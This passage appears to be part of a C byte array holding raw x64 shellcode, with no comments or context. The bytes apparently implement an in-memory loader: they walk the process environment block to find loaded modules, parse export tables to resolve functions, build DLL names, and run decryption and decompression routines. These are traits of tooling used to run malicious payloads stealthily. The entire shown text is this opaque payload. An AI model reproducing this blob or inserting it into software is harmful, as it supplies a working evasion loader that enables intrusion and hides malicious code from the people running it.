0x8d, 0x70, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x01, \n  0xff, 0x50, 0x18, 0x85, 0xc0, 0x0f, 0x85, 0xc0, 0x00, 0x00, 0x00, 0x48, \n  0x8b, 0x8d, 0x60, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x55, 0xe0, 0x48, 0x89, \n  0x4d, 0x20, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x18, 0x85, 0xc0, 0x0f, 0x85, \n  0xa3, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x85, 0x30, 0x01, 0x00, 0x00, 0xc7, \n  0x44, 0x24, 0x28, 0x00, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x86, 0x11, 0x06, \n  0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x44, 0x8b, 0xcb, 0x33, 0xd2, \n  0x33, 0xc9, 0xff, 0x56, 0x70, 0x48, 0x8d, 0x8d, 0x30, 0x01, 0x00, 0x00, \n  0xff, 0x96, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x8d, 0x60, 0x03, 0x00, \n  0x00, 0x44, 0x8d, 0x43, 0x03, 0x48, 0x8b, 0xd0, 0x48, 0x8b, 0xf8, 0x4c, \n  0x8b, 0x09, 0x41, 0xff, 0x51, 0x40, 0x48, 0x8b, 0xcf, 0x8b, 0xd8, 0xff, \n  0x96, 0x38, 0x01, 0x00, 0x00, 0x85, 0xdb, 0x75, 0x4a, 0x48, 0x83, 0x64, \n  0x24, 0x48, 0x00, 0x45, 0x33, 0xc9, 0x48, 0x83, 0x64, 0x24, 0x40, 0x00, \n  0x45, 0x33, 0xc0, 0x21, 0x5c, 0x24, 0x38, 0x49, 0x8b, 0xd6, 0x48, 0x8b, \n  0x8d, 0x70, 0x03, 0x00, 0x00, 0x21, 0x5c, 0x24, 0x30, 0x48, 0x83, 0x64, \n  0x24, 0x28, 0x00, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x48, 0x8b, 0x01, \n  0xff, 0x50, 0x28, 0x85, 0xc0, 0x75, 0x10, 0x48, 0x8b, 0x8d, 0x60, 0x03, \n  0x00, 0x00, 0x8d, 0x53, 0x02, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x28, 0x48, \n  0x8b, 0x8d, 0x70, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, \n  0x48, 0x8b, 0x8d, 0x60, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x01, 0xff, 0x50, \n  0x38, 0x48, 0x8b, 0x8d, 0x60, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x01, 0xff, \n  0x50, 0x10, 0x44, 0x8b, 0x86, 0x58, 0x0d, 0x00, 0x00, 0x33, 0xd2, 0x49, \n  0x8b, 0xce, 0x46, 0x8d, 0x04, 0x45, 0x02, 0x00, 0x00, 0x00, 0xe8, 0xb5, \n  0x0a, 0x00, 0x00, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0xc0, 0x00, 0x00, 0x49, \n  0x8b, 0xce, 0xff, 0x56, 0x50, 0x4c, 0x8d, 0x9c, 0x24, 0x40, 0x04, 0x00, \n  0x00, 0x49, 0x8b, 0x5b, 0x28, 0x49, 0x8b, 0x73, 0x38, 0x49, 0x8b, 0xe3, \n  0x41, 0x5e, 0x5f, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, \n  0x10, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, \n  0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x81, 0xec, 0xb0, \n  0x00, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, \n  0x48, 0x8b, 0xf1, 0x48, 0x81, 0xc1, 0x48, 0x03, 0x00, 0x00, 0x48, 0x8b, \n  0xea, 0x4c, 0x8b, 0x78, 0x60, 0xff, 0x56, 0x40, 0x33, 0xc9, 0x4c, 0x63, \n  0x48, 0x3c, 0x4c, 0x03, 0xc8, 0x45, 0x0f, 0xb7, 0x51, 0x14, 0x45, 0x0f, \n  0xb7, 0x41, 0x06, 0x4d, 0x03, 0xd1, 0x45, 0x85, 0xc0, 0x74, 0x19, 0x44, \n  0x8b, 0x8e, 0x40, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x14, 0x89, 0x45, 0x39, \n  0x4c, 0xd2, 0x18, 0x74, 0x3c, 0xff, 0xc1, 0x41, 0x3b, 0xc8, 0x72, 0xee, \n  0x8b, 0x9c, 0x24, 0xe0, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xbc, 0x24, 0xe0, \n  0x00, 0x00, 0x00, 0xff, 0x96, 0xc0, 0x00, 0x00, 0x00, 0x33, 0xd2, 0x85, \n  0xdb, 0x74, 0x3a, 0x4c, 0x8b, 0xc7, 0x49, 0x8d, 0x48, 0x08, 0x4d, 0x8b, \n  0xf0, 0x4c, 0x8b, 0xc1, 0x48, 0x39, 0x01, 0x74, 0x1a, 0xff, 0xc2, 0x3b, \n  0xd3, 0x72, 0xeb, 0xeb, 0x28, 0x41, 0x8b, 0x7c, 0xd2, 0x24, 0x41, 0x8b, \n  0x5c, 0xd2, 0x20, 0x48, 0x03, 0xf8, 0xc1, 0xeb, 0x03, 0xeb, 0xc8, 0x48, \n  0x8b, 0xd5, 0x49, 0x8b, 0xce, 0xff, 0x96, 0xf0, 0x01, 0x00, 0x00, 0xeb, \n  0x08, 0x4c, 0x8b, 0xb4, 0x24, 0xe0, 0x00, 0x00, 0x00, 0xff, 0x96, 0xb8, \n  0x00, 0x00, 0x00, 0x33, 0xed, 0x44, 0x8d, 0x4d, 0x01, 0x85, 0xdb, 0x74, \n  0x41, 0x48, 0x8d, 0x4f, 0x08, 0x48, 0x39, 0x01, 0x74, 0x0d, 0x41, 0x03, \n  0xe9, 0x48, 0x83, 0xc1, 0x08, 0x3b, 0xeb, 0x72, 0xf0, 0xeb, 0x2b, 0x45, \n  0x8a, 0xc1, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0x49, 0x8b, 0xd6, 0xff, 0x96, \n  0xd0, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x0c, 0xef, 0x41, 0xb8, 0x10, 0x00, \n  0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x20, 0xe8, 0x54, 0x09, 0x00, 0x00, \n  0x41, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x47, 0x18, 0x48, 0x8b, \n  0x78, 0x10, 0xe9, 0x02, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0xa6, 0x70, 0x03, \n  0x00, 0x00, 0x41, 0x8a, 0x0c, 0x24, 0x33, 0xed, 0x33, 0xd2, 0x45, 0x8b, \n  0xf9, 0x84, 0xc9, 0x0f, 0x84, 0xe5, 0x00, 0x00, 0x00, 0x45, 0x33, 0xc0, \n  0x80, 0xf9, 0x3b, 0x74, 0x2e, 0x81, 0xfa, 0x80, 0x00, 0x00, 0x00, 0x73, \n  0x26, 0x33, 0xc0, 0x42, 0x88, 0x4c, 0x04, 0x30, 0x80, 0xf9, 0x77, 0x41, \n  0x0f, 0x45, 0xc7, 0x80, 0xf9, 0x70, 0x44, 0x8b, 0xf8, 0x41, 0x0f, 0x44, \n  0xe9, 0x41, 0x03, 0xd1, 0x44, 0x8b, 0xc2, 0x42, 0x8a, 0x0c, 0x22, 0x84, \n  0xc9, 0x75, 0xcd, 0x85, 0xd2, 0x0f, 0x84, 0xa7, 0x00, 0x00, 0x00, 0x8d, \n  0x4a, 0x01, 0xc6, 0x44, 0x14, 0x30, 0x00, 0x48, 0x8b, 0x57, 0x30, 0x4c, \n  0x8d, 0x44, 0x24, 0x30, 0x4c, 0x03, 0xe1, 0x45, 0x33, 0xc9, 0x48, 0x8b, \n  0xce, 0xe8, 0xa2, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xd8, 0x41, 0xb9, 0x01, \n  0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x82, 0x45, 0x85, 0xff, 0x74, \n  0x38, 0x85, 0xed, 0x74, 0x14, 0xff, 0xd3, 0x48, 0x8b, 0xd8, 0x41, 0xb9, \n  0x01, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x65, 0xff, 0xff, \n  0xff, 0x48, 0x8b, 0x13, 0x48, 0x8b, 0xce, 0xe8, 0xa4, 0xe5, 0xff, 0xff, \n  0x41, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x4c, 0xff, \n  0xff, 0xff, 0x48, 0x8b, 0x44, 0x24, 0x28, 0xeb, 0x35, 0x85, 0xed, 0x74, \n  0x14, 0xff, 0xd3, 0x48, 0x8b, 0xd8, 0x41, 0xb9, 0x01, 0x00, 0x00, 0x00, \n  0x48, 0x85, 0xc0, 0x0f, 0x84, 0x2d, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x13, \n  0x48, 0x8b, 0xce, 0xe8, 0x6c, 0xe5, 0xff, 0xff, 0x41, 0xb9, 0x01, 0x00, \n  0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x14, 0xff, 0xff, 0xff, 0x49, 0x8b, \n  0x46, 0x08, 0x48, 0x89, 0x03, 0xe9, 0x08, 0xff, 0xff, 0xff, 0x48, 0x8b, \n  0x3f, 0x48, 0x83, 0x7f, 0x30, 0x00, 0x0f, 0x85, 0xf3, 0xfe, 0xff, 0xff, \n  0x4c, 0x8d, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x41, 0x8b, 0xc1, 0x49, \n  0x8b, 0x5b, 0x38, 0x49, 0x8b, 0x6b, 0x40, 0x49, 0x8b, 0x73, 0x48, 0x49, \n  0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, \n  0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, \n  0x83, 0xec, 0x60, 0x41, 0x83, 0xca, 0xff, 0x45, 0x33, 0xc0, 0x48, 0x8b, \n  0xf1, 0x44, 0x38, 0x02, 0x74, 0x19, 0x41, 0x83, 0xf8, 0x40, 0x73, 0x13, \n  0x41, 0x8a, 0x04, 0x10, 0x42, 0x88, 0x44, 0x04, 0x20, 0x41, 0xff, 0xc0, \n  0x41, 0x80, 0x3c, 0x10, 0x00, 0x75, 0xe7, 0x41, 0x8d, 0x40, 0xfc, 0x42, \n  0xc6, 0x44, 0x04, 0x20, 0x00, 0x80, 0x7c, 0x04, 0x20, 0x2e, 0x74, 0x2a, \n  0x42, 0xc6, 0x44, 0x04, 0x20, 0x2e, 0x41, 0xff, 0xc0, 0x42, 0xc6, 0x44, \n  0x04, 0x20, 0x64, 0x41, 0xff, 0xc0, 0x42, 0xc6, 0x44, 0x04, 0x20, 0x6c, \n  0x41, 0xff, 0xc0, 0x41, 0x8d, 0x40, 0x01, 0x42, 0xc6, 0x44, 0x04, 0x20, \n  0x6c, 0xc6, 0x44, 0x04, 0x20, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, \n  0x00, 0x00, 0x00, 0x48, 0x8b, 0x48, 0x60, 0x48, 0x8b, 0x41, 0x18, 0x48, \n  0x8b, 0x78, 0x10, 0x48, 0x8b, 0x5f, 0x30, 0x48, 0x85, 0xdb, 0x74, 0x39, \n  0x48, 0x63, 0x43, 0x3c, 0x8b, 0x8c, 0x18, 0x88, 0x00, 0x00, 0x00, 0x33, \n  0xc0, 0x85, 0xc9, 0x74, 0x1b, 0x8b, 0x54, 0x19, 0x0c, 0x48, 0x8d, 0x4c, \n  0x24, 0x20, 0x48, 0x03, 0xd3, 0xe8, 0xba, 0x07, 0x00, 0x00, 0x44, 0x8b, \n  0xd0, 0x33, 0xc0, 0x45, 0x85, 0xd2, 0x74, 0x25, 0x48, 0x8b, 0x3f, 0x45, \n  0x85, 0xd2, 0x75, 0xc3, 0x48, 0x85, 0xc0, 0x75, 0x08, 0x48, 0x8d, 0x4c, \n  0x24, 0x20, 0xff, 0x56, 0x30, 0x48, 0x8b, 0x5c, 0x24, 0x70, 0x48, 0x8b, \n  0x74, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x60, 0x5f, 0xc3, 0x48, 0x8b, 0xc3, \n  0xeb, 0xeb, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x4c, 0x89, 0x44, \n  0x24, 0x18, 0x48, 0x89, 0x4c, 0x24, 0x08, 0x55, 0x56, 0x57, 0x41, 0x54, \n  0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x81, 0xec, 0xa0, 0x00, 0x00, \n  0x00, 0x45, 0x33, 0xdb, 0x48, 0x8b, 0xfa, 0x4c, 0x8b, 0xd1, 0x41, 0x8b, \n  0xdb, 0x48, 0x85, 0xd2, 0x0f, 0x84, 0x52, 0x01, 0x00, 0x00, 0x4c, 0x63, \n  0x7a, 0x3c, 0x41, 0x8b, 0x84, 0x17, 0x88, 0x00, 0x00, 0x00, 0x85, 0xc0, \n  0x0f, 0x84, 0x3e, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x34, 0x02, 0x44, 0x8b, \n  0x76, 0x1c, 0x44, 0x8b, 0x6e, 0x20, 0x4c, 0x03, 0xf2, 0x44, 0x8b, 0x66, \n  0x24, 0x4c, 0x03, 0xea, 0x4c, 0x03, 0xe2, 0x4d, 0x85, 0xc0, 0x0f, 0x84, \n  0x0c, 0x01, 0x00, 0x00, 0x8b, 0x6e, 0x18, 0x85, 0xed, 0x0f, 0x84, 0x11, \n  0x01, 0x00, 0x00, 0x8d, 0x45, 0xff, 0x49, 0x8b, 0xd0, 0x41, 0x8b, 0x4c, \n  0x85, 0x00, 0x8b, 0xe8, 0x48, 0x03, 0xcf, 0x48, 0x89, 0x84, 0x24, 0xe8, \n  0x00, 0x00, 0x00, 0xe8, 0xd0, 0x06, 0x00, 0x00, 0x45, 0x33, 0xdb, 0x85, \n  0xc0, 0x75, 0x14, 0x48, 0x8b, 0x84, 0x24, 0xe8, 0x00, 0x00, 0x00, 0x41, \n  0x0f, 0xb7, 0x04, 0x44, 0x41, 0x8b, 0x1c, 0x86, 0x48, 0x03, 0xdf, 0x85, \n  0xed, 0x74, 0x0d, 0x4c, 0x8b, 0x84, 0x24, 0xf0, 0x00, 0x00, 0x00, 0x48, \n  0x85, 0xdb, 0x74, 0xb7, 0x4c, 0x8b, 0x94, 0x24, 0xe0, 0x00, 0x00, 0x00, \n  0x48, 0x3b, 0xde, 0x0f, 0x82, 0xa2, 0x00, 0x00, 0x00, 0x41, 0x8b, 0x84, \n  0x3f, 0x8c, 0x00, 0x00, 0x00, 0x48, 0x03, 0xc6, 0x48, 0x3b, 0xd8, 0x0f, \n  0x83, 0x8e, 0x00, 0x00, 0x00, 0x45, 0x8b, 0xc3, 0x44, 0x38, 0x1b, 0x74, \n  0x1e, 0x41, 0x83, 0xf8, 0x3c, 0x73, 0x18, 0x41, 0x8b, 0xc0, 0x8a, 0x0c, \n  0x18, 0x88, 0x4c, 0x04, 0x20, 0x80, 0xf9, 0x2e, 0x74, 0x09, 0x41, 0xff, \n  0xc0, 0x45, 0x38, 0x1c, 0x18, 0x75, 0xe2, 0x41, 0x8d, 0x40, 0x01, 0x8b, \n  0xd0, 0xc6, 0x44, 0x04, 0x20, 0x64, 0x41, 0x8d, 0x40, 0x02, 0xc6, 0x44, \n  0x04, 0x20, 0x6c, 0x41, 0x8d, 0x40, 0x03, 0xc6, 0x44, 0x04, 0x20, 0x6c, \n  0x41, 0x8d, 0x40, 0x04, 0x4c, 0x8d, 0x04, 0x1a, 0x44, 0x88, 0x5c, 0x04, \n  0x20, 0x41, 0x8b, 0xd3, 0x45, 0x38, 0x18, 0x74, 0x17, 0x83, 0xfa, 0x3f, \n  0x73, 0x12, 0x8b, 0xca, 0xff, 0xc2, 0x42, 0x8a, 0x04, 0x01, 0x88, 0x44, \n  0x0c, 0x60, 0x46, 0x38, 0x1c, 0x02, 0x75, 0xe9, 0x8b, 0xc2, 0x4c, 0x8d, \n  0x4c, 0x24, 0x60, 0x4c, 0x8d, 0x44, 0x24, 0x20, 0x48, 0x8b, 0xd7, 0x49, \n  0x8b, 0xca, 0x44, 0x88, 0x5c, 0x04, 0x60, 0xe8, 0xfc, 0xdc, 0xff, 0xff, \n  0x48, 0x8b, 0xd8, 0x48, 0x8b, 0xc3, 0xeb, 0x12, 0x44, 0x2b, 0x4e, 0x10, \n  0x43, 0x8b, 0x1c, 0x8e, 0x48, 0x03, 0xdf, 0xe9, 0x40, 0xff, 0xff, 0xff, \n  0x33, 0xc0, 0x48, 0x8b, 0x9c, 0x24, 0xf8, 0x00, 0x00, 0x00, 0x48, 0x81, \n  0xc4, 0xa0, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, \n  0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, \n  0x08, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, \n  0x48, 0x83, 0xec, 0x20, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, 0x00, 0x00, \n  0x00, 0x49, 0x8b, 0xf8, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xe9, 0x45, 0x33, \n  0xd2, 0x4c, 0x8b, 0x48, 0x60, 0x49, 0x8b, 0x41, 0x18, 0x48, 0x8b, 0x58, \n  0x10, 0xeb, 0x1c, 0x4d, 0x85, 0xd2, 0x75, 0x20, 0x4c, 0x8b, 0xcf, 0x4c, \n  0x8b, 0xc6, 0x48, 0x8b, 0xd0, 0x48, 0x8b, 0xcd, 0xe8, 0xbf, 0xda, 0xff, \n  0xff, 0x48, 0x8b, 0x1b, 0x4c, 0x8b, 0xd0, 0x48, 0x8b, 0x43, 0x30, 0x48, \n  0x85, 0xc0, 0x75, 0xdb, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x49, 0x8b, 0xc2, \n  0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, \n  0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x6c, \n  0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, 0x41, 0x56, 0x41, 0x57, \n  0x48, 0x83, 0xec, 0x30, 0x33, 0xf6, 0x33, 0xed, 0x45, 0x33, 0xf6, 0x48, \n  0x8b, 0xfa, 0x4c, 0x8b, 0xf9, 0x42, 0x8a, 0x4c, 0x3d, 0x00, 0x84, 0xc9, \n  0x74, 0x14, 0x83, 0xfd, 0x40, 0x74, 0x0f, 0x88, 0x4c, 0x34, 0x20, 0xff, \n  0xc5, 0xff, 0xc6, 0x83, 0xfe, 0x10, 0x75, 0x67, 0xeb, 0x53, 0x8b, 0xc6, \n  0x48, 0x8d, 0x5c, 0x24, 0x20, 0x48, 0x03, 0xd8, 0x41, 0xb8, 0x10, 0x00, \n  0x00, 0x00, 0x48, 0x8b, 0xcb, 0x44, 0x2b, 0xc6, 0x33, 0xd2, 0xe8, 0xcd, \n  0x04, 0x00, 0x00, 0xc6, 0x03, 0x80, 0x83, 0xfe, 0x0c, 0x72, 0x20, 0x48, \n  0x8b, 0xd7, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0x58, 0x00, 0x00, 0x00, \n  0x33, 0xd2, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0x48, 0x33, 0xf8, 0x44, 0x8d, \n  0x42, 0x10, 0xe8, 0xa5, 0x04, 0x00, 0x00, 0x8d, 0x04, 0xed, 0x00, 0x00, \n  0x00, 0x00, 0x41, 0xff, 0xc6, 0x89, 0x44, 0x24, 0x2c, 0x48, 0x8b, 0xd7, \n  0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0x2a, 0x00, 0x00, 0x00, 0x48, 0x33, \n  0xf8, 0x33, 0xf6, 0x45, 0x85, 0xf6, 0x0f, 0x84, 0x75, 0xff, 0xff, 0xff, \n  0x48, 0x8b, 0x5c, 0x24, 0x58, 0x48, 0x8b, 0xc7, 0x48, 0x8b, 0x6c, 0x24, \n  0x60, 0x48, 0x8b, 0x74, 0x24, 0x68, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, \n  0x41, 0x5e, 0x5f, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x10, 0x0f, 0x10, \n  0x01, 0x48, 0x89, 0x54, 0x24, 0x28, 0x8b, 0xca, 0x44, 0x8b, 0x44, 0x24, \n  0x2c, 0x45, 0x33, 0xd2, 0x0f, 0x11, 0x04, 0x24, 0x8b, 0x54, 0x24, 0x0c, \n  0x44, 0x8b, 0x5c, 0x24, 0x08, 0x8b, 0x5c, 0x24, 0x04, 0x44, 0x8b, 0x0c, \n  0x24, 0x8b, 0xc2, 0xc1, 0xc9, 0x08, 0x41, 0x03, 0xc8, 0x8b, 0xd3, 0x41, \n  0x33, 0xc9, 0xc1, 0xca, 0x08, 0x41, 0x03, 0xd1, 0x41, 0xc1, 0xc0, 0x03, \n  0x41, 0x33, 0xd2, 0x41, 0xc1, 0xc1, 0x03, 0x44, 0x33, 0xca, 0x44, 0x33, \n  0xc1, 0x41, 0xff, 0xc2, 0x41, 0x8b, 0xdb, 0x44, 0x8b, 0xd8, 0x41, 0x83, \n  0xfa, 0x1b, 0x72, 0xcd, 0x89, 0x4c, 0x24, 0x28, 0x44, 0x89, 0x44, 0x24, \n  0x2c, 0x48, 0x8b, 0x44, 0x24, 0x28, 0x48, 0x83, 0xc4, 0x10, 0x5b, 0xc3, \n  0x45, 0x85, 0xc9, 0x0f, 0x84, 0x45, 0x01, 0x00, 0x00, 0x48, 0x89, 0x5c, \n  0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, \n  0x55, 0x41, 0x54, 0x41, 0x56, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x10, \n  0x4c, 0x8b, 0xd9, 0x48, 0x8d, 0x45, 0xf0, 0x4c, 0x2b, 0xd8, 0x4c, 0x8d, \n  0x72, 0x0f, 0x49, 0x8b, 0xf8, 0x41, 0xbc, 0x10, 0x00, 0x00, 0x00, 0x48, \n  0x8d, 0x45, 0xf0, 0x49, 0x3b, 0xc6, 0x77, 0x13, 0x48, 0x8d, 0x45, 0xff, \n  0x48, 0x3b, 0xc2, 0x72, 0x0a, 0x0f, 0x10, 0x02, 0xf3, 0x0f, 0x7f, 0x45, \n  0xf0, 0xeb, 0x08, 0x0f, 0x10, 0x02, 0xf3, 0x0f, 0x7f, 0x45, 0xf0, 0x48, \n  0x8d, 0x4d, 0xf0, 0x41, 0xb8, 0x04, 0x00, 0x00, 0x00, 0x41, 0x8b, 0x04, \n  0x0b, 0x31, 0x01, 0x48, 0x8d, 0x49, 0x04, 0x49, 0x83, 0xe8, 0x01, 0x75, \n  0xf0, 0x44, 0x8b, 0x45, 0xfc, 0x49, 0x8b, 0xdc, 0x8b, 0x45, 0xf8, 0x44, \n  0x8b, 0x55, 0xf4, 0x8b, 0x4d, 0xf0, 0x41, 0x03, 0xca, 0x41, 0x03, 0xc0, \n  0x41, 0xc1, 0xc2, 0x05, 0x44, 0x33, 0xd1, 0x41, 0xc1, 0xc0, 0x08, 0x44, \n  0x33, 0xc0, 0xc1, 0xc1, 0x10, 0x41, 0x03, 0xc2, 0x41, 0x03, 0xc8, 0x41, \n  0xc1, 0xc2, 0x07, 0x41, 0xc1, 0xc0, 0x0d, 0x44, 0x33, 0xd0, 0x44, 0x33, \n  0xc1, 0xc1, 0xc0, 0x10, 0x48, 0x83, 0xeb, 0x01, 0x75, 0xcc, 0x44, 0x89, \n  0x45, 0xfc, 0x44, 0x8d, 0x43, 0x04, 0x89, 0x4d, 0xf0, 0x48, 0x8d, 0x4d, \n  0xf0, 0x44, 0x89, 0x55, 0xf4, 0x89, 0x45, 0xf8, 0x42, 0x8b, 0x04, 0x19, \n  0x31, 0x01, 0x48, 0x8d, 0x49, 0x04, 0x49, 0x83, 0xe8, 0x01, 0x75, 0xf0, \n  0x45, 0x3b, 0xcc, 0x41, 0x8b, 0xc9, 0x41, 0x0f, 0x47, 0xcc, 0x44, 0x8b, \n  0xd1, 0x85, 0xc9, 0x74, 0x1d, 0x48, 0x8d, 0x5d, 0xf0, 0x4c, 0x8b, 0xc7, \n  0x48, 0x2b, 0xdf, 0x41, 0x8b, 0xf2, 0x42, 0x8a, 0x04, 0x03, 0x41, 0x30, \n  0x00, 0x49, 0xff, 0xc0, 0x48, 0x83, 0xee, 0x01, 0x75, 0xf0, 0x44, 0x2b, \n  0xc9, 0x45, 0x8b, 0xc4, 0x49, 0x03, 0xfa, 0x41, 0x8d, 0x40, 0xff, 0x80, \n  0x04, 0x10, 0x01, 0x75, 0x08, 0x41, 0xff, 0xc8, 0x45, 0x85, 0xc0, 0x7f, \n  0xee, 0x45, 0x85, 0xc9, 0x0f, 0x85, 0x05, 0xff, 0xff, 0xff, 0x48, 0x8b, \n  0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x8b, 0x7c, 0x24, \n  0x40, 0x48, 0x83, 0xc4, 0x10, 0x41, 0x5e, 0x41, 0x5c, 0x5d, 0xc3, 0xcc, \n  0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48, \n  0x89, 0x78, 0x18, 0x4c, 0x89, 0x70, 0x20, 0x55, 0x48, 0x8b, 0xec, 0x48, \n  0x83, 0xec, 0x40, 0x8a, 0x01, 0x41, 0x83, 0xce, 0xff, 0x83, 0x65, 0xf4, \n  0x00, 0x45, 0x33, 0xc9, 0x88, 0x02, 0x33, 0xff, 0x48, 0x8d, 0x42, 0x01, \n  0x48, 0x8b, 0xda, 0x48, 0x89, 0x45, 0xe8, 0x45, 0x8b, 0xde, 0x48, 0x8d, \n  0x41, 0x01, 0x48, 0x89, 0x45, 0xe0, 0x8d, 0x77, 0x01, 0x48, 0x8d, 0x4d, \n  0xe0, 0xe8, 0xf6, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0xaa, 0x01, \n  0x00, 0x00, 0x48, 0x8d, 0x4d, 0xe0, 0xe8, 0xe5, 0x01, 0x00, 0x00, 0x85, \n  0xc0, 0x0f, 0x84, 0x9f, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0xe0, 0xe8, \n  0xd4, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x74, 0x4e, 0x45, 0x33, 0xc9, 0x45, \n  0x8d, 0x51, 0x04, 0x48, 0x8d, 0x4d, 0xe0, 0xe8, 0xc0, 0x01, 0x00, 0x00, \n  0x46, 0x8d, 0x0c, 0x48, 0x44, 0x2b, 0xd6, 0x75, 0xee, 0x45, 0x85, 0xc9, \n  0x74, 0x1d, 0x48, 0x8b, 0x55, 0xe8, 0x48, 0x8b, 0xc2, 0x41, 0x8b, 0xc9, \n  0x48, 0x2b, 0xc1, 0x8a, 0x00, 0x88, 0x02, 0x48, 0x03, 0xd6, 0x48, 0x89, \n  0x55, 0xe8, 0xe9, 0x6b, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x45, 0xe8, 0xc6, \n  0x00, 0x00, 0x48, 0x03, 0xc6, 0x48, 0x89, 0x45, 0xe8, 0xe9, 0x58, 0x01, \n  0x00, 0x00, 0x48, 0x8b, 0x45, 0xe0, 0x44, 0x0f, 0xb6, 0x18, 0x48, 0x03, \n  0xc6, 0x41, 0x8b, 0xcb, 0x48, 0x89, 0x45, 0xe0, 0x23, 0xce, 0x83, 0xc1, \n  0x02, 0x41, 0xd1, 0xeb, 0x74, 0x21, 0x48, 0x8b, 0x55, 0xe8, 0x45, 0x8b, \n  0xc3, 0x49, 0xf7, 0xd8, 0x41, 0x8a, 0x04, 0x10, 0x88, 0x02, 0x48, 0x03, \n  0xd6, 0x41, 0x03, 0xce, 0x75, 0xf2, 0x48, 0x89, 0x55, 0xe8, 0xe9, 0xfc, \n  0x00, 0x00, 0x00, 0x8b, 0xfe, 0xe9, 0xf5, 0x00, 0x00, 0x00, 0x44, 0x8b, \n  0xd6, 0x48, 0x8d, 0x4d, 0xe0, 0xe8, 0x32, 0x01, 0x00, 0x00, 0x48, 0x8d, \n  0x4d, 0xe0, 0x46, 0x8d, 0x14, 0x50, 0xe8, 0x25, 0x01, 0x00, 0x00, 0x85, \n  0xc0, 0x75, 0xe6, 0x45, 0x85, 0xc9, 0x75, 0x48, 0x41, 0x83, 0xfa, 0x02, \n  0x75, 0x42, 0x44, 0x8b, 0xce, 0x48, 0x8d, 0x4d, 0xe0, 0xe8, 0x0a, 0x01, \n  0x00, 0x00, 0x48, 0x8d, 0x4d, 0xe0, 0x46, 0x8d, 0x0c, 0x48, 0xe8, 0xfd, \n  0x00, 0x00, 0x00, 0x85, 0xc0, 0x75, 0xe6, 0x45, 0x85, 0xc9, 0x0f, 0x84, \n  0xa7, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0xe8, 0x41, 0x8b, 0xd3, 0x48, \n  0xf7, 0xda, 0x8a, 0x04, 0x0a, 0x88, 0x01, 0x48, 0x03, 0xce, 0x45, 0x03, \n  0xce, 0x75, 0xf3, 0xe9, 0x87, 